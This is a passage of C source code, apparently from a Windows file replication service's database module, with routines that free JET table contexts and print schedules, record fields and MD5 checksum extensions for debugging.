    NodeType  -- The node type this TABLE_CTX is part of for marking freed mem.

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsFreeTableCtx:"

    ULONG NumberColumns = 0;
    ULONG SetColSize;
    ULONG RetColSize;
    ULONG Marker;
    PJET_TABLECREATE JTableCreate;
    PJET_SETCOLUMN JSetColumn;
    PJET_RETRIEVECOLUMN JRetColumn;
    PCHAR BaseTableName;
    ULONG RecordSize;

    if (TableCtx == NULL) {
        DPRINT(0, "++ ERROR - DbsFreeTableCtx TableCtx ia null\n");
        return;
    }

    //
    // If the TableCtx was never allocated then return quietly.
    //
    if (IS_INVALID_TABLE(TableCtx)) {
        return;
    }

    if (!IS_REPLICA_TABLE(TableCtx->TableType)) {
        DPRINT2(3, "++ ERROR - DbsFreeTableCtx TableCtx, bad TableType (%d)\n",
                TableCtx, TableCtx->TableType);
        return;
    }

    JTableCreate = TableCtx->pJetTableCreate;
    if (IS_TABLE_OPEN(TableCtx)) {
        BaseTableName = JTableCreate->szTableName;
        DPRINT2(0, "++ ERROR - DbsFreeTableCtx called with %s%05d table still open\n",
               BaseTableName, TableCtx->ReplicaNumber);
        return;
    }

    //
    // Fill the node with a marker then free it.
    //
    Marker = (ULONG)0xDEADBE00 + NodeType;

    //
    // Release the buffer storage for the record's variable len fields.
    // Then free the base data record.  If the data record pointer is null
    // then the caller has taken the record and will handle freeing the memory.
    // If the caller supplied the data record then we do not free it here.
    //
    if ((TableCtx->pDataRecord != NULL) &&
        BooleanFlagOn(TableCtx->PropertyFlags, FRS_TPF_NOT_CALLER_DATAREC)) {
        //
        // Get the base record size from the offset field of the
        // first Record Fields entry.
        //
        RecordSize = (ULONG) (TableCtx->pRecordFields->Offset);
        DbsFreeRecordStorage(TableCtx);
        FillMemory(TableCtx->pDataRecord, RecordSize, (BYTE)Marker);
        TableCtx->pDataRecord = FrsFree(TableCtx->pDataRecord);
    }

    //
    // Get the number of columns in the table.
    //
    if (JTableCreate != NULL) {
        NumberColumns = JTableCreate->cColumns;
    }

    //
    // Get ptrs to the Jet Set/Ret column arrays.
    //
    JSetColumn = TableCtx->pJetSetCol;
    JRetColumn = TableCtx->pJetRetCol;

    //
    // Free the Jet Set column array.
    //
    if (JSetColumn != NULL) {
        if (NumberColumns == 0) {
            DPRINT1(0, "++ ERROR - Possible memory leak. NumberColumns zero but pJetSetCol: %08x\n",
                    JSetColumn);
            if (JTableCreate != NULL) {   // Make prefast happy
                DPRINT1(0, "++ ERROR - Table: %s\n", JTableCreate->szTableName);
            }
        }
        SetColSize = NumberColumns * sizeof(JET_SETCOLUMN);

        FillMemory(JSetColumn, SetColSize, (BYTE)Marker);
        TableCtx->pJetSetCol = FrsFree(JSetColumn);
    }

    //
    // Free the Jet Ret column array.
    //
    if (JRetColumn != NULL) {
        if (NumberColumns == 0) {
            DPRINT1(0, "++ ERROR - Possible memory leak. NumberColumns zero but pJetRetCol: %08x\n",
                   JRetColumn);
            if (JTableCreate != NULL) {   // Make prefast happy
                DPRINT1(0, "++ ERROR - Table: %s\n", JTableCreate->szTableName);
            }
        }
        RetColSize = NumberColumns * sizeof(JET_RETRIEVECOLUMN);

        FillMemory(JRetColumn, RetColSize, (BYTE)Marker);
        TableCtx->pJetRetCol = FrsFree(JRetColumn);
    }

    //
    // Mark table as not open and storage freed.
    //
    TableCtx->Tid = JET_tableidNil;
    TableCtx->Sesid = JET_sesidNil;
    TableCtx->pJetTableCreate = NULL;
    TableCtx->PropertyFlags = FRS_TPF_NONE;
    TableCtx->TableType = TABLE_TYPE_INVALID;
    TableCtx->pRecordFields = NULL;

    return;

}


VOID
DbsDisplaySchedule(
    IN ULONG        Severity,
    IN PCHAR        Debsub,
    IN ULONG        LineNo,
    IN PWCHAR       Header,
    IN PSCHEDULE    Schedule
    )
/*++

Routine Description:

    Print the schedule.

Arguments:

    Severity
    Debsub
    Header
    Schedule

Return Value:

    none.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsDisplaySchedule:"
    ULONG   i;

    //
    // Don't print this
    //
    if (!DoDebug(Severity, Debsub))
        return;

    //
    // Get debug lock so our output stays in one piece.
    //
    DebLock();

    try {

        DebPrintNoLock(Severity, TRUE, "%ws\n", Debsub, LineNo, Header);

        if (Schedule != NULL) {
            DebPrintNoLock(Severity, TRUE, "\tBandwidth        : %d\n",
                           Debsub, LineNo, Schedule->Bandwidth);
            DebPrintNoLock(Severity, TRUE, "\tNumberOfSchedules: %d\n",
                           Debsub, LineNo, Schedule->NumberOfSchedules);

            for (i = 0; i < Schedule->NumberOfSchedules; ++i) {
                DebPrintNoLock(Severity, TRUE, "\t\tType: %d\n",
                               Debsub, LineNo, Schedule->Schedules[i].Type);

                DebPrintNoLock(Severity, TRUE, "\t\tOffset: %d\n",
                               Debsub, LineNo, Schedule->Schedules[i].Offset);
            }
        }
    } finally {
        //
        // If the above took an exception make sure we drop the lock.
        //
        DebUnLock();
    }
}


VOID
DbsDisplayRecord(
    IN ULONG       Severity,
    IN PTABLE_CTX  TableCtx,
    IN BOOL        Read,
    IN PCHAR       Debsub,
    IN ULONG       uLineNo,
    IN PULONG      RecordFieldx,
    IN ULONG       FieldCount
    )
/*++

Routine Description:

    This routine displays the contents of the data record on stdout.
    It uses the field addresses in the JRetColumn struct to access the
    data.  The data type for the display comes from FieldInfo.DataType.

Arguments:

    Severity -- Severity level for print.  (See debug.c, debug.h)
    TableCtx  -- The table context struct which contains:

                FieldInfo  - Array of structs describing the size and offset
                             of each field.

                RecordBase - The base address of the record buffer to
                             read/write from/to jet.

                JTableCreate - The table create structure which provides info
                               about the columns that were created in the table.

                JRetColumn - The JET_RETRIEVECOLUMN struct array to initialize.
                             NULL if not provided.

    Read -- If true then display using the Jet Ret\col info else use Jet Set col info.
    Debsub -- Name of calling subroutine.
    uLineno -- Line number of caller
    RecordFieldx -- ptr to an array of field ids for the columns to display.
    FieldCount -- Then number of field entries in the RecordFieldx array.

MACRO:  FRS_DISPLAY_RECORD
MACRO:  DBS_DISPLAY_RECORD_SEV
MACRO:  DBS_DISPLAY_RECORD_SEV_COLS

Return Value:

    none.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsDisplayRecord:"

    ULONG MaxCols;
    ULONG i, j, k, ULong, *pULong;
    PVOID pData;
    ULONG DataType;
    JET_ERR jerr;

    PRECORD_FIELDS FieldInfo;
    PJET_TABLECREATE JTableCreate;
    PJET_RETRIEVECOLUMN JRetColumn;
    PJET_SETCOLUMN    JSetColumn;
    PJET_COLUMNCREATE JColDesc;

    PVOID RecordBase;
    PVOID RecordField;

    PREPLICA Replica;
    PWCHAR WStr;
    PDATA_EXTENSION_PREFIX ComponentPrefix;
    PDATA_EXTENSION_CHECKSUM DataChkSum;
    PULONG pOffset;
    PIDTABLE_RECORD_EXTENSION IdtExt;
    PCHANGE_ORDER_RECORD_EXTENSION CocExt;

    ULONG Len;
    CHAR  TimeStr[TIME_STRING_LENGTH];
    PFILE_FS_VOLUME_INFORMATION Fsvi;
    CHAR  GuidStr[GUID_CHAR_LEN];
    CHAR TableName[JET_cbNameMost];
    CHAR FlagBuffer[120];

    //
    // Don't print this
    //
    if (!DoDebug(Severity, Debsub))
        return;

    //
    // Get debug lock so our output stays in one piece.
    //
    DebLock();

    try {

        //
        // Point to the table create struct for column info and the
        // pointer to the record fields struct.
        // Get ptr to base of the data record.
        //
        JTableCreate = TableCtx->pJetTableCreate;
        FieldInfo    = TableCtx->pRecordFields + 1;  // skip elt 0
        JRetColumn   = TableCtx->pJetRetCol;
        JSetColumn   = TableCtx->pJetSetCol;
        RecordBase   = TableCtx->pDataRecord;
        //
        // If the info isn't there then we can't do it.
        //
        if ((JTableCreate == NULL)            ||
            (TableCtx->pRecordFields == NULL) ||
            (RecordBase == NULL)              ||
            (JSetColumn == NULL)              ||
            (JRetColumn == NULL)) {

            DebPrintNoLock(4, TRUE,
                           "Null ptr - JTableCreate: %08x, FieldInfo: "
                           "%08x, JRetColumn: %08x, JSetColumn: %08x, "
                           "RecordBase: %08x\n",
                           Debsub, uLineNo,
                           JTableCreate, TableCtx->pRecordFields, JRetColumn, JSetColumn, RecordBase);
            __leave;
        }

        //
        // Get the column descriptor information.
        //
        MaxCols  = JTableCreate->cColumns;
        JColDesc = JTableCreate->rgcolumncreate;


        if (BooleanFlagOn(TableCtx->PropertyFlags, FRS_TPF_SINGLE)) {
            strcpy(TableName, JTableCreate->szTableName);
        } else {
            sprintf(TableName, "%s%05d",
                    JTableCreate->szTableName, TableCtx->ReplicaNumber);
        }

        DebPrintNoLock(Severity, TRUE,
                       "Data Record for Table: ...%s...   ===   "
                       "===   ===   ===   ===   ===\n\n",
                       Debsub, uLineNo, TableName);

        //
        // Loop through the columns and print each one.
        //
        for (j=0; j<MaxCols; j++) {
            //
            // Use the selected col list if provided.
            //
            if (RecordFieldx != NULL) {
                if (j >= FieldCount) {
                    break;
                }

                i = RecordFieldx[j];

                if (i > MaxCols) {
                    DebPrintNoLock(Severity, TRUE, "ERROR - Bad field index: %d\n",
                                   Debsub, uLineNo, i);
                    continue;
                }
            } else {
                i = j;
            }

            //
            // Skip the spare fields.
            //
            if (IsSpareField(FieldInfo[i].DataType)) {
                continue;
            }

            //
            // If Read is True then use the info in the JetRetColumn struct.
            //
            if (Read) {
                Len   = JRetColumn[i].cbActual;
                pData = JRetColumn[i].pvData;
                jerr  = JRetColumn[i].err;
            } else {
                Len   = JSetColumn[i].cbData;
                pData = (PVOID) JSetColumn[i].pvData;
                jerr  = JSetColumn[i].err;
            }

            DebPrintNoLock(Severity, TRUE, "%-23s | Len/Ad/Er: %4d/%8x/%2d, ",
                           Debsub, uLineNo,
                           JColDesc[i].szColumnName, Len, pData, jerr);

            if (pData == NULL) {
                DebPrintNoLock(Severity, FALSE, "<NullPtr>\n", Debsub, uLineNo);
                continue;
            } else
            if (jerr == JET_wrnBufferTruncated) {
                DebPrintNoLock(Severity, FALSE, "<JET_wrnBufferTruncated>\n", Debsub, uLineNo);
                continue;
            } else
            if (jerr == JET_wrnColumnNull) {
                DebPrintNoLock(Severity, FALSE, "<JET_wrnColumnNull>\n", Debsub, uLineNo);
                continue;
            } else
            if (!JET_SUCCESS(jerr)) {
                DebPrintNoLock(Severity, FALSE, "<not JET_errSuccess>\n", Debsub, uLineNo);
                continue;
            }

            DataType = MaskPropFlags(FieldInfo[i].DataType);

    #define FRS_DEB_PRINT(_f, _d) \
            DebPrintNoLock(Severity, FALSE, _f, Debsub, uLineNo, _d)

            switch (DataType) {

            case DT_UNSPECIFIED:

                FRS_DEB_PRINT("%08x\n",  *(ULONG *)pData);
                break;

            case DT_NULL:

                FRS_DEB_PRINT("DT_NULL\n",  NULL);
                break;

            case DT_I2:

                FRS_DEB_PRINT("%8d\n",  *(SHORT *)pData);
                break;

            case DT_LONG:

                FRS_DEB_PRINT("%8d\n",  *(LONG *)pData);
                break;

            case DT_ULONG:

                FRS_DEB_PRINT("%08x\n",  *(ULONG *)pData);
                break;

            case DT_R4:

                FRS_DEB_PRINT("%08x\n",  *(ULONG *)pData);
                break;

            case DT_DOUBLE:

                FRS_DEB_PRINT("%016Lx\n",  *(LONGLONG *)pData);
                break;

            case DT_CURRENCY:

                FRS_DEB_PRINT("%8Ld\n",  *(LONGLONG *)pData);
                break;

            case DT_APDTIME:

                FRS_DEB_PRINT("%08x\n",  *(ULONG *)pData);
                break;

            case DT_ERROR:

                FRS_DEB_PRINT("%08x\n",  *(ULONG *)pData);
                break;

            case DT_BOOL:

                FRS_DEB_PRINT("%08x\n",  *(ULONG *)pData);
                break;

            case DT_OBJECT:

                FRS_DEB_PRINT("%08x\n",  *(ULONG *)pData);
                break;

            case DT_I8:

                FRS_DEB_PRINT("%8Ld\n",  *(LONGLONG *)pData);
                break;

            case DT_X8:
            case DT_USN:

                DebPrintNoLock(Severity, FALSE, "%08x %08x\n", Debsub, uLineNo,
                               *(((ULONG *) pData)+1), *(ULONG *)pData);
                break;

            case DT_STRING8:

                if (Len == 0) {
                    DebPrintNoLock(Severity, FALSE, "<null len string>\n", Debsub, uLineNo);
                } else

                if ((((CHAR *)pData)[Len-1]) != '\0') {
                    DebPrintNoLock(Severity, FALSE, "<not null terminated>\n", Debsub, uLineNo);
                } else {
                    FRS_DEB_PRINT("%s\n",  (CHAR *)pData);
                }
                break;

            case DT_UNICODE:
            case DT_FILENAME:
            case DT_FILE_LIST:
            case DT_DIR_PATH:

                if (Len == 0) {
                    DebPrintNoLock(Severity, FALSE, "<null len string>\n", Debsub, uLineNo);
                } else

                if ((((WCHAR *)pData)[(Len/sizeof(WCHAR))-1]) != UNICODE_NULL) {
                    DebPrintNoLock(Severity, FALSE, "<not null terminated>\n", Debsub, uLineNo);
                } else {
                    FRS_DEB_PRINT("%ws\n",  (WCHAR *)pData);
                }

                break;

            case DT_FILETIME:

                FileTimeToString((PFILETIME) pData, TimeStr);
                FRS_DEB_PRINT("%s\n", TimeStr);
                break;

            case DT_GUID:

                GuidToStr((GUID *) pData, GuidStr);
                FRS_DEB_PRINT("%s\n",  GuidStr);
                break;

            case DT_BINARY:

                FRS_DEB_PRINT("%08x\n",  *(ULONG *)pData);
                break;

            case DT_OBJID:

                GuidToStr((GUID *) pData, GuidStr);
                FRS_DEB_PRINT("%s\n",  GuidStr);
                break;

            case DT_FSVOLINFO:

                Fsvi = (PFILE_FS_VOLUME_INFORMATION) pData;

                DebPrintNoLock(Severity, FALSE,
                               "%ws (%d), %s, VSN: %08X, VolCreTim: ",
                               Debsub, uLineNo,
                               Fsvi->VolumeLabel,
                               Fsvi->VolumeLabelLength,
                               (Fsvi->SupportsObjects ? "(obj)" : "(no-obj)"),
                               Fsvi->VolumeSerialNumber);

                FileTimeToString((PFILETIME) &Fsvi->VolumeCreationTime, TimeStr);
                FRS_DEB_PRINT("%s\n", TimeStr);
                break;

            case DT_IDT_FLAGS:
                //
                // Decode and print the flags field in the IDTable record.
                //
                FrsFlagsToStr(*(ULONG *)pData, IDRecFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
                DebPrintNoLock(Severity, FALSE, "%08x Flags [%s]\n", Debsub, uLineNo,
                               *(ULONG *)pData, FlagBuffer);
                break;

            case DT_COCMD_FLAGS:
                //
                // Decode and print the flags field in the ChangeOrder record.
                //
                FrsFlagsToStr(*(ULONG *)pData, CoFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
                DebPrintNoLock(Severity, FALSE, "%08x Flags [%s]\n", Debsub, uLineNo,
                               *(ULONG *)pData, FlagBuffer);

                break;

            case DT_USN_FLAGS:
                //
                // Decode and print the USN Reason field in the USN Record.
                //
                FrsFlagsToStr(*(ULONG *)pData, UsnReasonNameTable, sizeof(FlagBuffer), FlagBuffer);
                DebPrintNoLock(Severity, FALSE, "%08x Flags [%s]\n", Debsub, uLineNo,
                               *(ULONG *)pData, FlagBuffer);

                break;

            case DT_CXTION_FLAGS:
                //
                // Decode and print the flags field in the connection record.
                //
                FrsFlagsToStr(*(ULONG *)pData, CxtionFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
                DebPrintNoLock(Severity, FALSE, "%08x Flags [%s]\n", Debsub, uLineNo,
                               *(ULONG *)pData, FlagBuffer);
                break;

            case DT_FILEATTR:
                //
                // Decode and print the file attributes field in IDTable and ChangeOrder records.
                //
                FrsFlagsToStr(*(ULONG *)pData, FileAttrFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
                DebPrintNoLock(Severity, FALSE, "%08x Flags [%s]\n", Debsub, uLineNo,
                               *(ULONG *)pData, FlagBuffer);
                break;

            case DT_COSTATE:

                ULong = *(ULONG *)pData;
                DebPrintNoLock(Severity, FALSE, "%08x  CO STATE:  %s\n", Debsub, uLineNo,
                               ULong,
                               (ULong <= IBCO_MAX_STATE) ? IbcoStateNames[ULong] : "INVALID STATE");
                break;

            case DT_COCMD_IFLAGS:
                //
                // Decode and print the Iflags field in the ChangeOrder record.
                //
                FrsFlagsToStr(*(ULONG *)pData, CoIFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
                DebPrintNoLock(Severity, FALSE, "%08x Flags [%s]\n", Debsub, uLineNo,
                               *(ULONG *)pData, FlagBuffer);

                break;

            case DT_CO_LOCN_CMD:
                //
                // Decode and print the change order location command.
                //
                ULong = *(ULONG *)pData;
                k = ((PCO_LOCATION_CMD)(pData))->Command;

                DebPrintNoLock(Severity, FALSE, "%08x  D/F %d   %s\n", Debsub, uLineNo,
                               ULong,
                               ((PCO_LOCATION_CMD)(pData))->DirOrFile,
                               (k <= CO_LOCATION_NUM_CMD) ? CoLocationNames[k] : "Invalid Location Cmd");
                break;

            case DT_REPLICA_ID:
                //
                // Translate the replica ID number to a name.
                //
                ULong = *(ULONG *)pData;
                WStr = L"???";
    #if 0
                //
                // Note: can't get the lock below since we will hang.
                // Need another way to get the replica name.
                //
                Replica = RcsFindReplicaById(ULong);
                if ((Replica != NULL) &&
                    (Replica->ReplicaName != NULL) &&
                    (Replica->ReplicaName->Name != NULL)){
                    WStr = Replica->ReplicaName->Name;
                }
    #endif
                DebPrintNoLock(Severity, FALSE, "%d  [%ws]\n", Debsub, uLineNo,
                                ULong, WStr);
                break;

            case DT_CXTION_GUID:
                //
                // Translate inbound cxtion guid to string.
                // (need replica ptr to look up the cxtion).
                //
                GuidToStr((GUID *) pData, GuidStr);
                DebPrintNoLock(Severity, FALSE, "%s\n", Debsub, uLineNo, GuidStr);
                break;


            case DT_IDT_EXTENSION:

                if (Len == 0) {
                    DebPrintNoLock(Severity, FALSE, "<Zero len string>\n", Debsub, uLineNo);
                    break;
                }

                IdtExt = (PIDTABLE_RECORD_EXTENSION) pData;
                if ((IdtExt->FieldSize == 0) || (IdtExt->FieldSize > Len)) {
                    DebPrintNoLock(Severity, FALSE, "<FieldSize (%08x) zero or > Len>\n", Debsub, uLineNo,
                                   IdtExt->FieldSize);
                    break;
                }

                //
                // Loop thru the data component offset array and display each one.
                //
                pOffset = &IdtExt->Offset[0];
                pULong = NULL;

                while (*pOffset != 0) {
                    ComponentPrefix = (PDATA_EXTENSION_PREFIX) ((PCHAR)IdtExt + *pOffset);

                    //
                    // Check for DataExtend_MD5_CheckSum.
                    //
                    if (ComponentPrefix->Type == DataExtend_MD5_CheckSum) {
                        if (ComponentPrefix->Size != sizeof(DATA_EXTENSION_CHECKSUM)) {
                            DebPrintNoLock(Severity, FALSE, "<MD5_CheckSum Size (%08x) invalid>\n", Debsub, uLineNo,
                                           ComponentPrefix->Size);
                            break;
                        }
                        DataChkSum = (PDATA_EXTENSION_CHECKSUM) ComponentPrefix;
                        pULong = (PULONG) DataChkSum->Data;
                        DebPrintNoLock(Severity, FALSE, "MD5: %08x %08x %08x %08x\n", Debsub, uLineNo,
                                       *pULong, *(pULong+1), *(pULong+2), *(pULong+3));
                        break;
                    }

                    pOffset += 1;
                }

                if (pULong == NULL) {
                    DebPrintNoLock(Severity, FALSE, "No MD5 - ", Debsub, uLineNo);
                    pULong = (PULONG) IdtExt;
                    for (k=0; k < (IdtExt->FieldSize / sizeof(ULONG)); k++) {
                        DebPrintNoLock(Severity, FALSE, "%08x  ", Debsub, uLineNo, pULong[k]);
                    }
                    DebPrintNoLock(Severity, FALSE, "\n", Debsub, uLineNo);
                }
                break;


            case DT_COCMD_EXTENSION:

                if (Len == 0) {
                    DebPrintNoLock(Severity, FALSE, "<Zero len string>\n", Debsub, uLineNo);
                    break;
                }

                if (pData == NULL) {
                    DebPrintNoLock(Severity, FALSE, "<NullPtr>\n", Debsub, uLineNo);
                    break;
                }

                CocExt = (PCHANGE_ORDER_RECORD_EXTENSION) pData;
                if ((CocExt->FieldSize == 0) || (CocExt->FieldSize > Len)) {
                    DebPrintNoLock(Severity, FALSE, "<FieldSize (%08x) zero or > Len>\n", Debsub, uLineNo,
                                   CocExt->FieldSize);
                    break;
                }

                //
                // Loop thru the data component offset array and display each one.
                //
                pOffset = &CocExt->Offset[0];
                pULong = NULL;

                while (*pOffset != 0) {
                    ComponentPrefix = (PDATA_EXTENSION_PREFIX) ((PCHAR)CocExt + *pOffset);

                    //
                    // Check for DataExtend_MD5_CheckSum.
                    //
                    if (ComponentPrefix->Type == DataExtend_MD5_CheckSum) {
                        if (ComponentPrefix->Size != sizeof(DATA_EXTENSION_CHECKSUM)) {
                            DebPrintNoLock(Severity, FALSE, "<MD5_CheckSum Size (%08x) invalid>\n", Debsub, uLineNo,
                                           ComponentPrefix->Size);
                            break;
                        }
                        DataChkSum = (PDATA_EXTENSION_CHECKSUM) ComponentPrefix;
                        pULong = (PULONG) DataChkSum->Data;
                        DebPrintNoLock(Severity, FALSE, "MD5: %08x %08x %08x %08x\n", Debsub, uLineNo,
                                       *pULong, *(pULong+1), *(pULong+2), *(pULong+3));
                        break;
                    }

                    pOffset += 1;
                }

                if (pULong == NULL) {
                    DebPrintNoLock(Severity, FALSE, "No MD5 - ", Debsub, uLineNo);
                    pULong = (PULONG) CocExt;
                    for (k=0; k < (CocExt->FieldSize / sizeof(ULONG)); k++) {
                        DebPrintNoLock(Severity, FALSE, "%08x  ", Debsub, uLineNo, pULong[k]);
                    }
                    DebPrintNoLock(Severity, FALSE, "\n", Debsub, uLineNo);
                }
                break;


            default:

                FRS_DEB_PRINT("<invalid type: %d>\n",  DataType);


            }  // end switch

        }  // end loop


    } finally {
        //
        // If the above took an exception make sure we drop the lock.
        //
        DebUnLock();
    }
}



VOID
DbsIPrintExtensionField(
    IN PVOID       ExtRec,
    IN PINFO_TABLE InfoTable
    )

/*++

Routine Description:

    Display the Extension Field record.

    Assumes:
    All data extension formats have the same prefix offset format.
    We use PIDTABLE_RECORD_EXTENSION here.

Arguments:

    ExtRec - ptr to the extension field data.
    InfoTable

Thread Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsIPrintExtensionField:"

    ULONG  k, ULong, *pULong, FieldSize;
    PDATA_EXTENSION_PREFIX   ComponentPrefix;
    PDATA_EXTENSION_CHECKSUM DataChkSum;
    PDATA_EXTENSION_RETRY_TIMEOUT RetryTimeout;
    CHAR    TimeStr[MAX_PATH];
    PULONG                   pOffset;


    if (ExtRec == NULL) {
        IPRINT0(InfoTable->Info, "Extension                    : Null\n");
        return;
    }

    FieldSize = ((PIDTABLE_RECORD_EXTENSION)ExtRec)->FieldSize;
    if (FieldSize == 0) {
        IPRINT0(InfoTable->Info, "Extension                    : Fieldsize zero\n");
        return;
    }

    //
    // Loop thru the data component offset array and display each one.
    //
    pOffset = &(((PIDTABLE_RECORD_EXTENSION)ExtRec)->Offset[0]);
    pULong = NULL;

    while (*pOffset != 0) {
        ComponentPrefix = (PDATA_EXTENSION_PREFIX) ((PCHAR)ExtRec + *pOffset);

        //
        // Check for DataExtend_MD5_CheckSum.
        //
        if (ComponentPrefix->Type == DataExtend_MD5_CheckSum) {
            if (ComponentPrefix->Size != sizeof(DATA_EXTENSION_CHECKSUM)) {
                IPRINT1(InfoTable->Info,
                        "MD5CheckSum                  : MD5 bad size (%08x)\n",
                        ComponentPrefix->Size);
            } else {
                DataChkSum = (PDATA_EXTENSION_CHECKSUM) ComponentPrefix;
                pULong = (PULONG) DataChkSum->Data;
                IPRINT4(InfoTable->Info,
                        "MD5CheckSum                  : MD5: %08x %08x %08x %08x \n",
                        *pULong, *(pULong+1), *(pULong+2), *(pULong+3));
            }
        }

        //
        // Check for DataExtend_Retry_Timeout.
        //
        if (ComponentPrefix->Type == DataExtend_Retry_Timeout) {
            if (ComponentPrefix->Size != sizeof(DATA_EXTENSION_RETRY_TIMEOUT)) {
                IPRINT1(InfoTable->Info,
                        "RetryCount                   : bad size extension (%08x)\n",
                        ComponentPrefix->Size);

                IPRINT1(InfoTable->Info,
                        "FirstTryTime                 : bad size extension (%08x)\n",
                        ComponentPrefix->Size);
            } else {
                RetryTimeout = (PDATA_EXTENSION_RETRY_TIMEOUT) ComponentPrefix;


                FileTimeToString((PFILETIME)&RetryTimeout->FirstTryTime, TimeStr);

                IPRINT1(InfoTable->Info,
                        "RetryCount                   : %d\n", RetryTimeout->Count);

                IPRINT1(InfoTable->Info,
                        "FirstTryTime                 : %s\n", TimeStr);
            }
        }

        pOffset += 1;
    }

    //
    // If the data is garbled then give a raw dump.
    //
    if (pULong == NULL) {
        IPRINT0(InfoTable->Info, "Extension                    : Invalid data\n");
        pULong = (PULONG) ExtRec;

        for (k=0; k < (FieldSize / sizeof(ULONG)); k++) {
            if (k > 16) {
                break;
            }
            IPRINT2(InfoTable->Info, "Extension                    : (%08x) %08x\n", k, pULong[k]);
        }
    }
}



VOID
DbsDisplayRecordIPrint(
    IN PTABLE_CTX  TableCtx,
    IN PINFO_TABLE InfoTable,
    IN BOOL        Read,
    IN PULONG      RecordFieldx,
    IN ULONG       FieldCount
    )
/*++

Routine Description:

    This routine displays the contents of the data record on the infoprint
    interface.  It also doesn't supply the function name, line number or time
    stamp prefix on each record.

    It uses the field addresses in the JRetColumn struct to access the
    data.  The data type for the display comes from FieldInfo.DataType.

Arguments:

    TableCtx  -- The table context struct which contains:

                FieldInfo  - Array of structs describing the size and offset
                             of each field.

                RecordBase - The base address of the record buffer to
                             read/write from/to jet.

                JTableCreate - The table create structure which provides info
                               about the columns that were created in the table.

                JRetColumn - The JET_RETRIEVECOLUMN struct array to initialize.
                             NULL if not provided.

    InfoTable -- Context for InfoPrint call.
    Read -- If true then display using the Jet Ret\col info else use Jet Set col info.
    RecordFieldx -- ptr to an array of field ids for the columns to display.
    FieldCount -- Then number of field entries in the RecordFieldx array.

Return Value:

    none.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsDisplayRecordIPrint:"

    ULONG MaxCols;
    ULONG i, j, k, ULong, *pULong;
    PVOID pData;
    ULONG DataType;
    JET_ERR jerr;

    PRECORD_FIELDS FieldInfo;
    PJET_TABLECREATE JTableCreate;
    PJET_RETRIEVECOLUMN JRetColumn;
    PJET_SETCOLUMN    JSetColumn;
    PJET_COLUMNCREATE JColDesc;

    PVOID RecordBase;

    PREPLICA Replica;
    PWCHAR WStr;

    ULONG Len;
    CHAR  TimeStr[TIME_STRING_LENGTH];
    PFILE_FS_VOLUME_INFORMATION Fsvi;
    CHAR  GuidStr[GUID_CHAR_LEN];
    CHAR TableName[JET_cbNameMost];
    CHAR FlagBuffer[120];


#define FRS_INFO_PRINT(_Format, _d1)                       \
    InfoPrint(InfoTable->Info, "%-28s : " _Format,         \
              JColDesc[i].szColumnName, _d1)

#define FRS_INFO_PRINT2(_Format, _d1, _d2)                 \
    InfoPrint(InfoTable->Info, "%-28s : " _Format,         \
              JColDesc[i].szColumnName, _d1, _d2)

#define FRS_INFO_PRINT3(_Format, _d1, _d2, _d3)            \
    InfoPrint(InfoTable->Info, "%-28s : " _Format,         \
              JColDesc[i].szColumnName, _d1, _d2, _d3)

#define FRS_INFO_PRINT4(_Format, _d1, _d2, _d3, _d4)       \
    InfoPrint(InfoTable->Info, "%-28s : " _Format,         \
              JColDesc[i].szColumnName, _d1, _d2, _d3, _d4)

    //
    // Point to the table create struct for column info and the
    // pointer to the record fields struct.
    // Get ptr to base of the data record.
    //
    JTableCreate = TableCtx->pJetTableCreate;
    FieldInfo    = TableCtx->pRecordFields + 1;  // skip elt 0
    JRetColumn   = TableCtx->pJetRetCol;
    JSetColumn   = TableCtx->pJetSetCol;
    RecordBase   = TableCtx->pDataRecord;
    //
    // If the info isn't there then we can't do it.
    //
    if ((JTableCreate == NULL)            ||
        (TableCtx->pRecordFields == NULL) ||
        (RecordBase == NULL)              ||
        (JSetColumn == NULL)              ||
        (JRetColumn == NULL)) {
        DPRINT5(4, "Null ptr - JTableCreate: %08x, FieldInfo: "
                   "%08x, JRetColumn: %08x, JSetColumn: %08x, "
                   "RecordBase: %08x\n",
                JTableCreate, TableCtx->pRecordFields, JRetColumn,
                JSetColumn, RecordBase);
        return;
    }

    //
    // Get the column descriptor information.
    //
    MaxCols  = JTableCreate->cColumns;
    JColDesc = JTableCreate->rgcolumncreate;


    if (BooleanFlagOn(TableCtx->PropertyFlags, FRS_TPF_SINGLE)) {
        strcpy(TableName, JTableCreate->szTableName);
    } else {
        sprintf(TableName, "%s%05d",
                JTableCreate->szTableName, TableCtx->ReplicaNumber);
    }


    //
    // Loop through the columns and print each one.
    //
    for (j=0; j<MaxCols; j++) {
        //
        // Use the selected col list if provided.
        //
        if (RecordFieldx != NULL) {
            if (j >= FieldCount) {
                break;
            }

            i = RecordFieldx[j];

            if (i > MaxCols) {
                FRS_INFO_PRINT("ERROR - Bad field index: %d\n", i);
                continue;
            }
        } else {
            i = j;
        }

        //
        // Skip the spare fields.
        //
        if (IsSpareField(FieldInfo[i].DataType)) {
            continue;
        }

        //
        // If Read is True then use the info in the JetRetColumn struct.
        //
        if (Read) {
            Len   = JRetColumn[i].cbActual;
            pData = JRetColumn[i].pvData;
            jerr  = JRetColumn[i].err;
        } else {
            Len   = JSetColumn[i].cbData;
            pData = (PVOID) JSetColumn[i].pvData;
            jerr  = JSetColumn[i].err;
        }


        if (pData == NULL) {
            FRS_INFO_PRINT("%s\n", "<NullPtr>");
            continue;
        } else
        if (jerr == JET_wrnBufferTruncated) {
            FRS_INFO_PRINT("%s\n", "<JET_wrnBufferTruncated>");
            continue;
        } else
        if (jerr == JET_wrnColumnNull) {
            FRS_INFO_PRINT("%s\n", "<JET_wrnColumnNull>");
            continue;
        } else
        if (!JET_SUCCESS(jerr)) {
            FRS_INFO_PRINT("%s\n", "<not JET_errSuccess>");
            continue;
        }

        DataType = MaskPropFlags(FieldInfo[i].DataType);


        switch (DataType) {

        case DT_UNSPECIFIED:

            FRS_INFO_PRINT("%08x\n",  *(ULONG *)pData);
            break;

        case DT_NULL:

            FRS_INFO_PRINT("DT_NULL\n",  NULL);
            break;

